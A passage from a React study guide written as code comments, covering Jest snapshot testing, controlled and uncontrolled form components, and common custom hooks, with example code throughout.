    const { container } = render(<Button variant="secondary">Secondary</Button>);
    expect(container).toMatchSnapshot();
  });
  
  test('disabled state', () => {
    const { container } = render(<Button disabled>Disabled</Button>);
    expect(container).toMatchSnapshot();
  });
});

// 3. Complex Components
test('dashboard layout', () => {
  const { container } = render(
    <Dashboard
      user={mockUser}
      notifications={mockNotifications}
      stats={mockStats}
    />
  );
  expect(container).toMatchSnapshot();
});

// 4. API Responses
test('API response structure', async () => {
  const response = await fetchUserData('123');
  expect(response).toMatchSnapshot({
    // Ignore dynamic fields
    id: expect.any(String),
    createdAt: expect.any(String),
  });
});

Inline Snapshots:
-----------------

// Instead of separate file, snapshot inline

test('inline snapshot', () => {
  const { container } = render(<Button>Click me</Button>);
  
  expect(container).toMatchInlineSnapshot(`
    <div>
      <button class="btn btn-primary">
        Click me
      </button>
    </div>
  `);
});

// Snapshot written directly in test file
// Easier to review in code review

Property Matchers:
------------------

// Ignore dynamic values

test('user with timestamp', () => {
  const user = {
    id: generateId(),
    name: 'John',
    createdAt: new Date().toISOString()
  };
  
  expect(user).toMatchSnapshot({
    id: expect.any(String),          // Match any string
    createdAt: expect.any(String),   // Match any string
  });
});

// Snapshot only captures static parts:
// {
//   "id": Any<String>,
//   "name": "John",
//   "createdAt": Any<String>
// }

Custom Serializers:
-------------------

// Customize how objects are serialized

// Custom serializer for Dates
expect.addSnapshotSerializer({
  test: val => val instanceof Date,
  print: val => `Date("${val.toISOString()}")`,
});

// Custom serializer for React Elements
import { createSerializer } from '@emotion/jest';
expect.addSnapshotSerializer(createSerializer());

Snapshot Testing Best Practices:
---------------------------------

// 1. Keep snapshots small
// ❌ Bad - too large
test('entire app snapshot', () => {
  const { container } = render(<App />);
  expect(container).toMatchSnapshot(); // Thousands of lines!
});

// ✅ Good - focused
test('header component', () => {
  const { container } = render(<Header />);
  expect(container).toMatchSnapshot();
});

// 2. Use descriptive test names
// ❌ Bad
test('snapshot 1', () => {});
test('snapshot 2', () => {});

// ✅ Good
test('renders primary button', () => {});
test('renders disabled button', () => {});

// 3. Review snapshots in code review
// Don't blindly update snapshots
// Understand why they changed

// 4. Commit snapshots to version control
// Snapshots are part of tests

// 5. Use property matchers for dynamic data
test('with dynamic data', () => {
  expect(data).toMatchSnapshot({
    id: expect.any(Number),
    timestamp: expect.any(String),
  });
});

// 6. Don't snapshot too much
// Snapshot testing is not a replacement for proper assertions

// ❌ Bad - snapshots everything
test('form behavior', () => {
  const { container } = render(<Form />);
  expect(container).toMatchSnapshot();
  
  fireEvent.click(submitButton);
  expect(container).toMatchSnapshot();
  
  // Hard to understand what changed
});

// ✅ Good - specific assertions
test('form behavior', () => {
  render(<Form />);
  
  fireEvent.click(submitButton);
  
  expect(screen.getByText('Form submitted')).toBeInTheDocument();
  expect(onSubmit).toHaveBeenCalledWith(expectedData);
});

Snapshot Testing Gotchas:
--------------------------

// 1. Date/Time issues
// ❌ Bad - will fail every time
test('shows timestamp', () => {
  const { container } = render(<Post timestamp={new Date()} />);
  expect(container).toMatchSnapshot();
});

// ✅ Good - mock date or use matcher
test('shows timestamp', () => {
  const fixedDate = new Date('2024-01-01');
  const { container } = render(<Post timestamp={fixedDate} />);
  expect(container).toMatchSnapshot();
});

// 2. Random values
// ❌ Bad - generates different IDs
test('list items', () => {
  const items = generateItems(); // Uses Math.random()
  const { container } = render(<List items={items} />);
  expect(container).toMatchSnapshot();
});

// ✅ Good - deterministic data
test('list items', () => {
  const items = [
    { id: '1', name: 'Item 1' },
    { id: '2', name: 'Item 2' }
  ];
  const { container } = render(<List items={items} />);
  expect(container).toMatchSnapshot();
});

// 3. Fragile snapshots
// Snapshots break on minor style changes
// Use only for stable components

Real-World Example:
-------------------

// UserProfile.jsx
function UserProfile({ user }) {
  return (
    <div className="profile">
      <img src={user.avatar} alt={user.name} />
      <h2>{user.name}</h2>
      <p>{user.email}</p>
      <div className="stats">
        <div>
          <strong>{user.followers}</strong>
          <span>Followers</span>
        </div>
        <div>
          <strong>{user.following}</strong>
          <span>Following</span>
        </div>
      </div>
      {user.verified && <Badge text="Verified" />}
    </div>
  );
}

// UserProfile.test.js
describe('UserProfile snapshots', () => {
  const baseUser = {
    id: '123',
    name: 'John Doe',
    email: 'john@example.com',
    avatar: 'avatar.jpg',
    followers: 100,
    following: 50,
    verified: false
  };
  
  test('renders basic profile', () => {
    const { container } = render(<UserProfile user={baseUser} />);
    expect(container).toMatchSnapshot();
  });
  
  test('renders verified profile', () => {
    const user = { ...baseUser, verified: true };
    const { container } = render(<UserProfile user={user} />);
    expect(container).toMatchSnapshot();
  });
  
  test('renders profile with many followers', () => {
    const user = { ...baseUser, followers: 10000 };
    const { container } = render(<UserProfile user={user} />);
    expect(container).toMatchSnapshot();
  });
});

// Generated snapshots:
// __snapshots__/UserProfile.test.js.snap

exports[`UserProfile snapshots renders basic profile 1`] = `
<div>
  <div class="profile">
    <img alt="John Doe" src="avatar.jpg" />
    <h2>John Doe</h2>
    <p>john@example.com</p>
    <div class="stats">
      <div>
        <strong>100</strong>
        <span>Followers</span>
      </div>
      <div>
        <strong>50</strong>
        <span>Following</span>
      </div>
    </div>
  </div>
</div>
`;

Snapshot Testing Alternatives:
-------------------------------

// Visual Regression Testing (better for UI)
// - Percy.io
// - Chromatic
// - Applitools

// Takes screenshots instead of HTML snapshots
// Detects visual changes pixel by pixel
// Better for catching CSS/styling issues

// Snapshot testing is better for:
// - Data structures
// - API responses
// - Simple component structure

// Visual regression is better for:
// - Complex layouts
// - Responsive design
// - Cross-browser rendering
// - CSS changes

When to Use Snapshot Testing:
------------------------------

// ✅ Use snapshot testing for:
// - Component structure verification
// - Preventing accidental UI changes
// - API response structure
// - Error messages
// - Simple components
// - Generated code output

// ❌ Don't use snapshot testing for:
// - Complex user interactions
// - Business logic
// - Async behavior
// - Frequently changing components
// - Instead of proper assertions

Summary:

Snapshot Testing:
- Captures component output
- Saves as reference file
- Compares future runs
- Detects unexpected changes
- Update with -u flag
- Keep snapshots small and focused
- Review changes carefully
- Commit snapshots to git
- Use property matchers for dynamic data
- Complement, don't replace, proper tests
- Built into Jest
- Great for regression testing
*/





/**
96. What is the uncontrolled component pattern?
----------------------------------------------

Uncontrolled components are form inputs that maintain their own internal state
in the DOM, rather than being controlled by React state. You access their values
using refs instead of controlled state updates.

Basic Uncontrolled Component:
------------------------------

// Uncontrolled input with ref
function UncontrolledForm() {
  const nameRef = useRef(null);
  const emailRef = useRef(null);
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Access values directly from DOM
    console.log('Name:', nameRef.current.value);
    console.log('Email:', emailRef.current.value);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input
        ref={nameRef}
        type="text"
        name="name"
        defaultValue="John"  // defaultValue, not value
      />
      <input
        ref={emailRef}
        type="email"
        name="email"
      />
      <button type="submit">Submit</button>
    </form>
  );
}

// Key characteristics:
// ✅ Uses ref to access values
// ✅ Uses defaultValue instead of value
// ✅ DOM maintains state, not React
// ✅ No onChange handlers needed

File Input (Always Uncontrolled):
----------------------------------

// File inputs are always uncontrolled
function FileUpload() {
  const fileRef = useRef(null);
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    const files = fileRef.current.files;
    if (files.length > 0) {
      console.log('Selected file:', files[0].name);
      // Upload file
      uploadFile(files[0]);
    }
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input
        ref={fileRef}
        type="file"
        accept="image/*"
      />
      <button type="submit">Upload</button>
    </form>
  );
}

// File inputs cannot be controlled (security reasons)
// Must use ref to access

Uncontrolled with Default Values:
----------------------------------

function UncontrolledInput() {
  const inputRef = useRef(null);
  
  return (
    <div>
      {/* Use defaultValue for initial value * /}
      <input
        ref={inputRef}
        type="text"
        defaultValue="Initial text"
      />
      
      {/* Use defaultChecked for checkboxes * /}
      <input
        type="checkbox"
        defaultChecked={true}
      />
      
      {/* Use defaultValue for select * /}
      <select defaultValue="option2">
        <option value="option1">Option 1</option>
        <option value="option2">Option 2</option>
      </select>
    </div>
  );
}

Complex Uncontrolled Form:
---------------------------

function UncontrolledComplexForm() {
  const formRef = useRef(null);
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Get form data using FormData API
    const formData = new FormData(formRef.current);
    
    const data = {
      username: formData.get('username'),
      email: formData.get('email'),
      password: formData.get('password'),
      gender: formData.get('gender'),
      newsletter: formData.get('newsletter') === 'on',
      interests: formData.getAll('interests')
    };
    
    console.log('Form data:', data);
    submitForm(data);
  };
  
  const handleReset = () => {
    formRef.current.reset();
  };
  
  return (
    <form ref={formRef} onSubmit={handleSubmit}>
      <input
        name="username"
        type="text"
        placeholder="Username"
        defaultValue=""
      />
      
      <input
        name="email"
        type="email"
        placeholder="Email"
        defaultValue=""
      />
      
      <input
        name="password"
        type="password"
        placeholder="Password"
      />
      
      <fieldset>
        <legend>Gender</legend>
        <label>
          <input type="radio" name="gender" value="male" defaultChecked />
          Male
        </label>
        <label>
          <input type="radio" name="gender" value="female" />
          Female
        </label>
      </fieldset>
      
      <label>
        <input type="checkbox" name="newsletter" />
        Subscribe to newsletter
      </label>
      
      <fieldset>
        <legend>Interests</legend>
        <label>
          <input type="checkbox" name="interests" value="coding" />
          Coding
        </label>
        <label>
          <input type="checkbox" name="interests" value="reading" />
          Reading
        </label>
        <label>
          <input type="checkbox" name="interests" value="gaming" />
          Gaming
        </label>
      </fieldset>
      
      <button type="submit">Submit</button>
      <button type="button" onClick={handleReset}>Reset</button>
    </form>
  );
}

When to Use Uncontrolled Components:
-------------------------------------

// ✅ Use uncontrolled when:

// 1. Simple forms without validation
function SimpleContactForm() {
  const formRef = useRef();
  
  const handleSubmit = (e) => {
    e.preventDefault();
    const formData = new FormData(formRef.current);
    sendContactForm(formData);
  };
  
  return (
    <form ref={formRef} onSubmit={handleSubmit}>
      <input name="name" placeholder="Name" required />
      <input name="email" placeholder="Email" type="email" required />
      <textarea name="message" placeholder="Message" required />
      <button type="submit">Send</button>
    </form>
  );
}

// 2. File uploads (must be uncontrolled)
function FileUploadForm() {
  const fileRef = useRef();
  
  const handleUpload = () => {
    const file = fileRef.current.files[0];
    uploadFile(file);
  };
  
  return (
    <div>
      <input ref={fileRef} type="file" />
      <button onClick={handleUpload}>Upload</button>
    </div>
  );
}

// 3. Integrating with non-React libraries
function TinyMCEEditor() {
  const editorRef = useRef();
  
  useEffect(() => {
    // Initialize TinyMCE (non-React library)
    tinymce.init({
      target: editorRef.current,
      plugins: 'link image code',
    });
    
    return () => {
      tinymce.remove();
    };
  }, []);
  
  return <textarea ref={editorRef} />;
}

// 4. Performance optimization (rare)
// Avoid re-renders for every keystroke
function LargeForm() {
  // 100 inputs that don't need real-time validation
  return (
    <form>
      {Array.from({ length: 100 }).map((_, i) => (
        <input key={i} name={`field-${i}`} />
      ))}
    </form>
  );
}

Pros and Cons:
--------------

// Pros:
// ✅ Less code (no state, no onChange)
// ✅ Better performance (no re-renders)
// ✅ Simple for basic forms
// ✅ Works with FormData API
// ✅ Native HTML behavior

// Cons:
// ❌ No real-time validation
// ❌ Harder to conditionally disable submit
// ❌ Can't easily format input
// ❌ Less React-like
// ❌ Harder to test
// ❌ No access to value until submit

Summary:

Uncontrolled Components:
- DOM maintains state, not React [web:172][web:174]
- Access values with refs [web:173]
- Use defaultValue/defaultChecked [web:174]
- Less code but less control [web:175]
- Good for simple forms [web:172]
- Required for file inputs [web:173]
- Better performance (no re-renders) [web:174]
*/


/**
97. What is the controlled component pattern?
--------------------------------------------

Controlled components have their form data controlled by React state. The component
renders based on state and updates state through event handlers, giving React
complete control over the form elements.

Basic Controlled Component:
----------------------------

function ControlledForm() {
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  
  const handleSubmit = (e) => {
    e.preventDefault();
    console.log('Name:', name);
    console.log('Email:', email);
    submitForm({ name, email });
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input
        type="text"
        value={name}  // Controlled by state
        onChange={(e) => setName(e.target.value)}  // Updates state
        placeholder="Name"
      />
      
      <input
        type="email"
        value={email}  // Controlled by state
        onChange={(e) => setEmail(e.target.value)}  // Updates state
        placeholder="Email"
      />
      
      <button type="submit">Submit</button>
    </form>
  );
}

// Key characteristics:
// ✅ Uses value prop (not defaultValue)
// ✅ Uses onChange handler
// ✅ React state as single source of truth
// ✅ Can validate in real-time

Controlled with Validation:
----------------------------

function ControlledWithValidation() {
  const [email, setEmail] = useState('');
  const [emailError, setEmailError] = useState('');
  
  const validateEmail = (value) => {
    if (!value) {
      return 'Email is required';
    }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
      return 'Invalid email format';
    }
    return '';
  };
  
  const handleEmailChange = (e) => {
    const value = e.target.value;
    setEmail(value);
    
    // Real-time validation
    const error = validateEmail(value);
    setEmailError(error);
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    const error = validateEmail(email);
    if (error) {
      setEmailError(error);
      return;
    }
    
    submitForm({ email });
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <div>
        <input
          type="email"
          value={email}
          onChange={handleEmailChange}
          placeholder="Email"
          className={emailError ? 'error' : ''}
        />
        {emailError && <span className="error-message">{emailError}</span>}
      </div>
      
      <button type="submit" disabled={!!emailError}>
        Submit
      </button>
    </form>
  );
}

Complex Controlled Form:
------------------------

function ControlledComplexForm() {
  const [formData, setFormData] = useState({
    username: '',
    email: '',
    password: '',
    confirmPassword: '',
    gender: 'male',
    newsletter: false,
    interests: [],
    country: 'US'
  });
  
  const [errors, setErrors] = useState({});
  
  // Generic handler for text inputs
  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };
  
  // Handler for checkboxes
  const handleCheckbox = (e) => {
    const { name, checked } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: checked
    }));
  };
  
  // Handler for multiple checkboxes (interests)
  const handleInterests = (e) => {
    const { value, checked } = e.target;
    setFormData(prev => ({
      ...prev,
      interests: checked
        ? [...prev.interests, value]
        : prev.interests.filter(i => i !== value)
    }));
  };
  
  const validate = () => {
    const newErrors = {};
    
    if (!formData.username) {
      newErrors.username = 'Username is required';
    } else if (formData.username.length < 3) {
      newErrors.username = 'Username must be at least 3 characters';
    }
    
    if (!formData.email) {
      newErrors.email = 'Email is required';
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = 'Invalid email format';
    }
    
    if (!formData.password) {
      newErrors.password = 'Password is required';
    } else if (formData.password.length < 6) {
      newErrors.password = 'Password must be at least 6 characters';
    }
    
    if (formData.password !== formData.confirmPassword) {
      newErrors.confirmPassword = 'Passwords do not match';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    if (validate()) {
      console.log('Form data:', formData);
      submitForm(formData);
    }
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <div>
        <input
          name="username"
          value={formData.username}
          onChange={handleChange}
          placeholder="Username"
        />
        {errors.username && <span className="error">{errors.username}</span>}
      </div>
      
      <div>
        <input
          name="email"
          type="email"
          value={formData.email}
          onChange={handleChange}
          placeholder="Email"
        />
        {errors.email && <span className="error">{errors.email}</span>}
      </div>
      
      <div>
        <input
          name="password"
          type="password"
          value={formData.password}
          onChange={handleChange}
          placeholder="Password"
        />
        {errors.password && <span className="error">{errors.password}</span>}
      </div>
      
      <div>
        <input
          name="confirmPassword"
          type="password"
          value={formData.confirmPassword}
          onChange={handleChange}
          placeholder="Confirm Password"
        />
        {errors.confirmPassword && <span className="error">{errors.confirmPassword}</span>}
      </div>
      
      <fieldset>
        <legend>Gender</legend>
        <label>
          <input
            type="radio"
            name="gender"
            value="male"
            checked={formData.gender === 'male'}
            onChange={handleChange}
          />
          Male
        </label>
        <label>
          <input
            type="radio"
            name="gender"
            value="female"
            checked={formData.gender === 'female'}
            onChange={handleChange}
          />
          Female
        </label>
      </fieldset>
      
      <label>
        <input
          name="newsletter"
          type="checkbox"
          checked={formData.newsletter}
          onChange={handleCheckbox}
        />
        Subscribe to newsletter
      </label>
      
      <fieldset>
        <legend>Interests</legend>
        {['coding', 'reading', 'gaming'].map(interest => (
          <label key={interest}>
            <input
              type="checkbox"
              value={interest}
              checked={formData.interests.includes(interest)}
              onChange={handleInterests}
            />
            {interest.charAt(0).toUpperCase() + interest.slice(1)}
          </label>
        ))}
      </fieldset>
      
      <select
        name="country"
        value={formData.country}
        onChange={handleChange}
      >
        <option value="US">United States</option>
        <option value="UK">United Kingdom</option>
        <option value="CA">Canada</option>
      </select>
      
      <button type="submit">Submit</button>
    </form>
  );
}

Input Formatting:
-----------------

// Format input value as user types
function PhoneInput() {
  const [phone, setPhone] = useState('');
  
  const formatPhone = (value) => {
    // Remove all non-digits
    const digits = value.replace(/\D/g, '');
    
    // Format as (123) 456-7890
    if (digits.length <= 3) {
      return digits;
    } else if (digits.length <= 6) {
      return `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
    } else {
      return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6, 10)}`;
    }
  };
  
  const handleChange = (e) => {
    const formatted = formatPhone(e.target.value);
    setPhone(formatted);
  };
  
  return (
    <input
      type="tel"
      value={phone}
      onChange={handleChange}
      placeholder="(123) 456-7890"
    />
  );
}

// Format currency
function CurrencyInput() {
  const [amount, setAmount] = useState('');
  
  const handleChange = (e) => {
    const value = e.target.value;
    
    // Allow only numbers and decimal point
    if (/^\d*\.?\d{0,2}$/.test(value) || value === '') {
      setAmount(value);
    }
  };
  
  return (
    <div>
      <span>$</span>
      <input
        type="text"
        value={amount}
        onChange={handleChange}
        placeholder="0.00"
      />
    </div>
  );
}

Conditional Rendering Based on Input:
--------------------------------------

function ConditionalForm() {
  const [accountType, setAccountType] = useState('personal');
  const [formData, setFormData] = useState({
    name: '',
    companyName: '',
    taxId: ''
  });
  
  return (
    <form>
      <select
        value={accountType}
        onChange={(e) => setAccountType(e.target.value)}
      >
        <option value="personal">Personal</option>
        <option value="business">Business</option>
      </select>
      
      <input
        name="name"
        value={formData.name}
        onChange={(e) => setFormData({...formData, name: e.target.value})}
        placeholder="Your Name"
      />
      
      {accountType === 'business' && (
        <>
          <input
            name="companyName"
            value={formData.companyName}
            onChange={(e) => setFormData({...formData, companyName: e.target.value})}
            placeholder="Company Name"
          />
          <input
            name="taxId"
            value={formData.taxId}
            onChange={(e) => setFormData({...formData, taxId: e.target.value})}
            placeholder="Tax ID"
          />
        </>
      )}
    </form>
  );
}

When to Use Controlled Components:
-----------------------------------

// ✅ Use controlled when:

// 1. Need validation
function ValidatedForm() {
  const [email, setEmail] = useState('');
  const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  
  return (
    <div>
      <input
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />
      <button disabled={!isValid}>Submit</button>
    </div>
  );
}

// 2. Need input formatting
function FormattedInput() {
  const [value, setValue] = useState('');
  
  const handleChange = (e) => {
    // Force uppercase
    setValue(e.target.value.toUpperCase());
  };
  
  return <input value={value} onChange={handleChange} />;
}

// 3. Multiple fields depend on each other
function DependentFields() {
  const [price, setPrice] = useState(0);
  const [quantity, setQuantity] = useState(1);
  const total = price * quantity;
  
  return (
    <div>
      <input
        type="number"
        value={price}
        onChange={(e) => setPrice(Number(e.target.value))}
      />
      <input
        type="number"
        value={quantity}
        onChange={(e) => setQuantity(Number(e.target.value))}
      />
      <p>Total: ${total}</p>
    </div>
  );
}

// 4. Need to trigger side effects
function SearchInput() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);
  
  useEffect(() => {
    if (query.length > 2) {
      searchAPI(query).then(setResults);
    }
  }, [query]);
  
  return (
    <div>
      <input
        value={query}
        onChange={(e) => setQuery(e.target.value)}
      />
      <Results data={results} />
    </div>
  );
}

Controlled vs Uncontrolled Comparison:
---------------------------------------

// Uncontrolled
function UncontrolledExample() {
  const inputRef = useRef();
  
  const handleSubmit = (e) => {
    e.preventDefault();
    console.log(inputRef.current.value);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input ref={inputRef} defaultValue="" />
      <button>Submit</button>
    </form>
  );
}

// Controlled
function ControlledExample() {
  const [value, setValue] = useState('');
  
  const handleSubmit = (e) => {
    e.preventDefault();
    console.log(value);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input
        value={value}
        onChange={(e) => setValue(e.target.value)}
      />
      <button>Submit</button>
    </form>
  );
}

// Feature              | Uncontrolled     | Controlled
// ---------------------|------------------|------------------
// State location       | DOM              | React state
// Access value         | ref              | state variable
// Initial value        | defaultValue     | state initial value
// Update value         | N/A              | setState
// Real-time validation | No               | Yes
// Formatting           | No               | Yes
// Conditional logic    | Hard             | Easy
// Performance          | Better           | More re-renders
// Code                 | Less             | More
// React way            | No               | Yes

Pros and Cons:
--------------

// Pros:
// ✅ React controls everything [web:174][web:175]
// ✅ Real-time validation [web:172]
// ✅ Conditional rendering [web:174]
// ✅ Input formatting [web:172]
// ✅ Easy to test [web:175]
// ✅ Single source of truth [web:174]

// Cons:
// ❌ More boilerplate code [web:175]
// ❌ Re-renders on every keystroke [web:174]
// ❌ Verbose for simple forms [web:172]

Summary:

Controlled Components:
- React state controls form data [web:172][web:174]
- Use value prop with onChange [web:174]
- Real-time validation possible [web:172][web:175]
- Can format input [web:172]
- More React-like approach [web:175]
- Recommended for most forms [web:172][web:174]
- Single source of truth [web:174]
*/


/**
98. What are custom hooks and when should you create one?
---------------------------------------------------------

Custom hooks are JavaScript functions that use React hooks and encapsulate
reusable stateful logic. They let you extract component logic into reusable
functions, following React's composition model.

Basic Custom Hook:
------------------

// Custom hook for toggle functionality
function useToggle(initialValue = false) {
  const [value, setValue] = useState(initialValue);
  
  const toggle = useCallback(() => {
    setValue(v => !v);
  }, []);
  
  const setTrue = useCallback(() => {
    setValue(true);
  }, []);
  
  const setFalse = useCallback(() => {
    setValue(false);
  }, []);
  
  return [value, { toggle, setTrue, setFalse }];
}

// Usage
function ModalComponent() {
  const [isOpen, { toggle, setTrue, setFalse }] = useToggle(false);
  
  return (
    <div>
      <button onClick={setTrue}>Open Modal</button>
      
      {isOpen && (
        <Modal onClose={setFalse}>
          <p>Modal content</p>
        </Modal>
      )}
    </div>
  );
}

Custom Hook Rules:
------------------

// 1. Must start with "use" [web:176][web:179]
// ✅ Good
function useCounter() { }
function useLocalStorage() { }
function useFetch() { }

// ❌ Bad
function counter() { } // Missing "use" prefix
function getUser() { } // Not a hook

// 2. Can only be called from React functions [web:176]
// ✅ Good
function Component() {
  const data = useCustomHook(); // In component
}

function useAnotherHook() {
  const data = useCustomHook(); // In another hook
}

// ❌ Bad
function regularFunction() {
  const data = useCustomHook(); // Can't use in regular function
}

// 3. Follow all hooks rules
// - Don't call in loops, conditions, or nested functions
// - Only call at top level

Common Custom Hooks:
--------------------

// 1. useLocalStorage - Persist state in localStorage
function useLocalStorage(key, initialValue) {
  // Get from localStorage or use initial value
  const [storedValue, setStoredValue] = useState(() => {
    try {
      const item = window.localStorage.getItem(key);
      return item ? JSON.parse(item) : initialValue;
    } catch (error) {
      console.error(error);
      return initialValue;
    }
  });
  
  // Update localStorage when value changes
  const setValue = (value) => {
    try {
      // Allow value to be a function like useState
      const valueToStore = value instanceof Function
        ? value(storedValue)
        : value;
      
      setStoredValue(valueToStore);
      window.localStorage.setItem(key, JSON.stringify(valueToStore));
    } catch (error) {
      console.error(error);
    }
  };
  
  return [storedValue, setValue];
}

// Usage
function App() {
  const [name, setName] = useLocalStorage('name', 'Guest');
  
  return (
    <div>
      <input
        value={name}
        onChange={(e) => setName(e.target.value)}
      />
      <p>Hello, {name}!</p>
    </div>
  );
}

// 2. useFetch - Data fetching
function useFetch(url) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  
  useEffect(() => {
    let cancelled = false;
    
    const fetchData = async () => {
      setLoading(true);
      setError(null);
      
      try {
        const response = await fetch(url);
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        const json = await response.json();
        
        if (!cancelled) {
          setData(json);
          setLoading(false);
        }
      } catch (err) {
        if (!cancelled) {
          setError(err.message);
          setLoading(false);
        }
      }
    };
    
    fetchData();
    
    return () => {
      cancelled = true;
    };
  }, [url]);
  
  return { data, loading, error };
}

// Usage
function UserProfile({ userId }) {
  const { data, loading, error } = useFetch(`/api/users/${userId}`);
  
  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error}</div>;
  if (!data) return <div>No user found</div>;
  
  return (
    <div>
      <h1>{data.name}</h1>
      <p>{data.email}</p>
    </div>
  );
}

// 3. useDebounce - Debounce value changes
function useDebounce(value, delay) {
  const [debouncedValue, setDebouncedValue] = useState(value);
  
  useEffect(() => {
    // Set timeout to update debounced value
    const handler = setTimeout(() => {
      setDebouncedValue(value);
    }, delay);
    
    // Clear timeout if value changes before delay
    return () => {
      clearTimeout(handler);
    };
  }, [value, delay]);
  
  return debouncedValue;
}

// Usage
function SearchComponent() {
  const [searchTerm, setSearchTerm] = useState('');
  const debouncedSearchTerm = useDebounce(searchTerm, 500);
  
  useEffect(() => {
    if (debouncedSearchTerm) {
      // Search API only after user stops typing for 500ms
      searchAPI(debouncedSearchTerm).then(setResults);
    }
  }, [debouncedSearchTerm]);
  
  return (
    <input
      value={searchTerm}
      onChange={(e) => setSearchTerm(e.target.value)}
      placeholder="Search..."
    />
  );
}

// 4. useWindowSize - Track window dimensions
function useWindowSize() {
  const [windowSize, setWindowSize] = useState({
    width: window.innerWidth,
    height: window.innerHeight
  });
  
  useEffect(() => {
    const handleResize = () => {
      setWindowSize({
        width: window.innerWidth,
        height: window.innerHeight
      });
    };
    
    window.addEventListener('resize', handleResize);
    
    return () => {
      window.removeEventListener('resize', handleResize);
    };
  }, []);
  
  return windowSize;
}

// Usage
function ResponsiveComponent() {
  const { width } = useWindowSize();
  
  return (
    <div>
      {width < 768 ? (
        <MobileView />
      ) : (
        <DesktopView />
      )}
    </div>
  );
}

// 5. useEventListener - Add event listeners [web:179]
function useEventListener(eventName, handler, element = window) {
  const savedHandler = useRef();
  
  // Update ref when handler changes
  useEffect(() => {
    savedHandler.current = handler;
  }, [handler]);
  
  useEffect(() => {
    const isSupported = element && element.addEventListener;
    if (!isSupported) return;
    
    // Create event listener that calls handler from ref
    const eventListener = (event) => savedHandler.current(event);
    
    element.addEventListener(eventName, eventListener);
    
    return () => {
      element.removeEventListener(eventName, eventListener);
    };
  }, [eventName, element]);
}

// Usage
function ClickTracker() {
  const [clickCount, setClickCount] = useState(0);
  
  useEventListener('click', () => {
    setClickCount(count => count + 1);
  });
  
  return <div>Clicks: {clickCount}</div>;
}

// 6. useForm - Form state management
function useForm(initialValues, validate) {
  const [values, setValues] = useState(initialValues);
  const [errors, setErrors] = useState({});
  const [touched, setTouched] = useState({});
  
  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    const newValue = type === 'checkbox' ? checked : value;
    
    setValues(prev => ({
      ...prev,
      [name]: newValue
    }));
  };
  
  const handleBlur = (e) => {
    const { name } = e.target;
    setTouched(prev => ({
      ...prev,
      [name]: true
    }));
    
    if (validate) {
      const validationErrors = validate(values);
      setErrors(validationErrors);
    }
  };
  
  const handleSubmit = (onSubmit) => (e) => {
    e.preventDefault();
    
    const validationErrors = validate ? validate(values) : {};
    setErrors(validationErrors);
    
    if (Object.keys(validationErrors).length === 0) {
      onSubmit(values);
    }
  };
  
  const resetForm = () => {
    setValues(initialValues);
    setErrors({});
    setTouched({});
  };
  
  return {
    values,
    errors,
    touched,
    handleChange,
    handleBlur,
    handleSubmit,
    resetForm
  };
}

// Usage
function LoginForm() {
  const initialValues = { email: '', password: '' };
  
  const validate = (values) => {
    const errors = {};
    
    if (!values.email) {
      errors.email = 'Email is required';
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(values.email)) {
      errors.email = 'Invalid email';
    }
    
    if (!values.password) {
      errors.password = 'Password is required';
    } else if (values.password.length < 6) {
      errors.password = 'Password must be at least 6 characters';
    }
    
    return errors;
  };
  
  const {
    values,
    errors,
    touched,
    handleChange,
    handleBlur,
    handleSubmit
  } = useForm(initialValues, validate);
  
  const onSubmit = (values) => {
    console.log('Submit:', values);
  };
  
  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      <div>
        <input
          name="email"
          value={values.email}
          onChange={handleChange}
          onBlur={handleBlur}
        />
        {touched.email && errors.email && <span>{errors.email}</span>}
      </div>
      
      <div>
        <input
          name="password"
          type="password"
          value={values.password}
          onChange={handleChange}
          onBlur={handleBlur}
        />
        {touched.password && errors.password && <span>{errors.password}</span>}
      </div>
      
      <button type="submit">Login</button>
    </form>
  );
}

// 7. usePrevious - Get previous value
function usePrevious(value) {
  const ref = useRef();
  
  useEffect(() => {
    ref.current = value;
  }, [value]);
  
  return ref.current;
}

// Usage
function Counter() {
  const [count, setCount] = useState(0);
  const prevCount = usePrevious(count);
  
  return (
    <div>
      <p>Current: {count}</p>
      <p>Previous: {prevCount}</p>
      <button onClick={() => setCount(count + 1)}>Increment</button>
    </div>
  );
}

When to Create Custom Hooks:
-----------------------------

// ✅ Create custom hook when: [web:176]

// 1. Logic is reused across multiple components [web:176]
// Same data fetching in many components
function useUserData(userId) {
  const [user, setUser] = useState(null);
  useEffect(() => {
    fetchUser(userId).then(setUser);
  }, [userId]);
  return user;
}

// 2. Complex stateful logic needs encapsulation [web:176][web:179]
// Complex form logic
function useComplexForm() {
  // Many useState, useEffect, etc.
  // Returns clean API
}

// 3. Side effects need cleanup [web:179]
// Event listeners, subscriptions
function useWebSocket(url) {
  const [data, setData] = useState(null);
  
  useEffect(() => {
